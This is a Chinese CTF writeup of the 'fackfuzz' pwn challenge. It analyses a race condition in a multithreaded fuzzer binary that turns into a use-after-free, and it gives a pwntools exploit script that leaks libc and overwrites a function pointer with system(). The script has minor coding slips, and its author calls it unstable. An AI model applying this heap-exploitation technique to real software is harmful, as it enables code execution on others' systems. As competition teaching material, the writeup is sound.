---
layout: post
title: 安恒杯武汉大学邀请赛fackfuzz Writeup
categories: [CTF,Writeup]
description: 安恒杯武汉大学邀请赛AD模式的第二道pwn题，是一道多线程竞态条件的题目
keywords: fackfuzz, Writeup, 武汉大学邀请赛
---

# 安恒杯武汉大学邀请赛fackfuzz Writeup

## 漏洞分析

这道题目是我的一个本科同学出的，也是CTF中比较少见的多线程竞态条件的题目，我觉得这个题目出的还是蛮好的，于是就写一下writeup。
运行一下可执行程序，可以看到此程序是一个驱动的fuzz程序

```
---->fack driver fuzzing<----
1. add a driver to fuzz
2. prepare fuzz data
3. start fuzzing
4. stop fuzzing
5. view driver list
6. exit
```

*	add a driver to fuzz 会分配一个形为
	{drivername readfuzzer writefuzzer ioctlfuzzer}的结构体
*	prepare fuzz data会分配一个结构体，包含start fuzzing时调用的函数所需参数
*	start fuzzing会启用三个fuzz的线程分别对驱动进行不断读、写、以及ioctl。
*	stop fuzzing会free掉在add driver和prepare data所分配的结构体。
*	view driver list会查看当前已添加的driver的driver name列表

程序的漏洞存在于函数**sub_401336**中

```
void __fastcall __noreturn freethread(void *a1)
{
  int idx; // [rsp+1Ch] [rbp-4h]@1
  idx = *(_DWORD *)a1;
  currentidx = idx;
  isstop[idx] = 1;
  free(ptr[idx]);
  puts("wait for fuzz thread done");
  sleep(3u);
  ptr[idx] = 0LL;
  if ( threadnum < 0 )
    threadnum = 0;
  free(data[idx]);
  data[idx] = 0LL;
  puts("stop this fuzz done!");
  pthread_exit(0LL);
}
```

此函数会在调用stop fuzzing的时候以pthread_create创建新进程的形式运行。由于free之后会有一个3秒的间隔。这个间隔原意是等待fuzz线程的结束，但是也导致了一个竞态条件的漏洞。

在调用stop fuzzing之后，ptr[idx]会被free掉，但是ptr[idx]在3秒内并没有置0，所以通过这个竞态条件来构造use after free漏洞。

## 漏洞利用

### 泄漏libc地址

当ptr[idx]被free掉之后，原本的driver name因为堆块被free会被覆盖成unsortbin的地址，如果主线程再次调用view driver list，即可拿到unsortbin的地址，这是一个libc的data段的地址，根据这个地址我们可以算出system函数地址。

### 劫持控制流

以下函数为stop fuzzing的处理函数,该函数通过比对driver name获取一个idx，最终这个idx会作为函数**sub_401336**中的idx。

```
__int64 stopfuzz()
{
  signed int i; // [rsp+Ch] [rbp-74h]@3
  char s2; // [rsp+10h] [rbp-70h]@1
  __int64 v3; // [rsp+78h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("input the driver name to stop fuzzing:");
  readn((__int64)&s2, 0x68uLL);
  if ( (unsigned int)checkname(&s2) )
  {
    for ( i = 0; i <= 9; ++i )
    {
      if ( ptr[i] && !strcmp(ptr[i], &s2) )
      {
        stop(i);
        return *MK_FP(__FS__, 40LL) ^ v3;
      }
    }
    puts("error name");
  }
  else
  {
    puts("invalid name");
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

但是，如果我们如果按照以下顺序进行调用

1. add a new driver
2. prepare fuzz data
3. prepare fuzz data
4. stop fuzzing
5. add a new driver
6. stop fuzzing
7. prepare fuzz data

调用1 2 3会为ptr[0] data[0] data[1]分配内存，调用会释放ptr[0]的所对应的块，但是由于ptr[0]在3秒内并不会被置空。

5被调用后，ptr[1]会被重新分配ptr[0]所指向的内存，也就是说ptr[0]与ptr[1]指向的是同一块内存，

接着调用6，ptr[0]与ptr[1]所指向的内存会被再次free，由于ptr[0]与ptr[1]指向同一块内容，所以根据stop fuzzing的处理函数的逻辑，只有ptr[0]会被在3秒后置0，ptr[1]则会指向一个被free的内存块

最后调用7，将ptr[1]所指向的内存重新分配到字符串readdata中，通过对readdata进行修改即可控制ptr[1]所指向的带有函数指针的结构体的值。从而劫持控制流。

值得一提的是，由于我们拿到的shell是子线程的shell，所以我们无法直接与该shell进行交互，我们可以通过system("cat flag")拿到flag。

## exploit代码

```
from pwn import *;
from time import sleep;
port=8888
objname = "fackfuzz"
objpath = "./"+objname
io = process(objpath)
elf = ELF(objpath)

def readuntil(delim):
    data = io.recvuntil(delim);
    print data;
    return data;

def readlen(len):
    data = io.recv(len,1);
    return data;

def readall():
    data = io.recv(4096,1);
    print data;
    return data;

def write(data):
    sleep(0.05)
    io.send(str(data));
    
def writeline(data):
    sleep(0.05)
    io.sendline(str(data));

def padding(size):
    cf = "/bin/shcat/home/ctf/flag";
    paddata = "";
    for i in range(size):
        paddatax += cf[i%len(cf)];
    return paddata;

def newdriver(name):
    writeline(1);
    writeline(name)
    readall()
def prepare(readsize,readdata):
    writeline(2);
    writeline(readsize);
    writeline(readdata);
    writeline(2);
    writeline(1);
    writeline(1);
    writeline(1);
    writeline(1);
    readall()
def startfuzz(name):
    writeline(3);
    writeline(name);
    readall();
def stopfuzz(name):
    writeline(4);
    writeline(name);
    readall();
def viewdriver():
    writeline(5);
    print readuntil(":");
    return readuntil("\n")[:-1];

def attack(ip=0):
    global io
    if ip != 0:
        io = remote(ip,port)
    newdriver("/dev/haha1");
    prepare(10,"haha1")
    prepare(50,"cat flag > /dev/fd/1\x00")
    stopfuzz("/dev/haha1");
    usortbin=viewdriver();
    usortbin=usortbin+(8-len(usortbin))*'\x00';
    usortbin=u64(usortbin);
    system=usortbin-0x378178
    print hex(system);
    newdriver("/dev/haha3");0x01e36010
    stopfuzz("/dev/haha3");
    sleep(4)
    
    payload="/dev/haha4\x00"
    payload+=(0x68-len(payload))*"A";
    payload+=p64(system)*3;
    prepare(0x88,payload);
    print viewdriver()
    
    startfuzz("/dev/haha4");
    sleep(3)
    readall()#get flag

attack()
```

**此exploit理论上应该没问题，但是实际攻击的时候却不是很稳定，有时候得不到flag，我调试了很久也没有找到原因，还希望找到原因的同学联系我分享一下你的想法,感激不尽**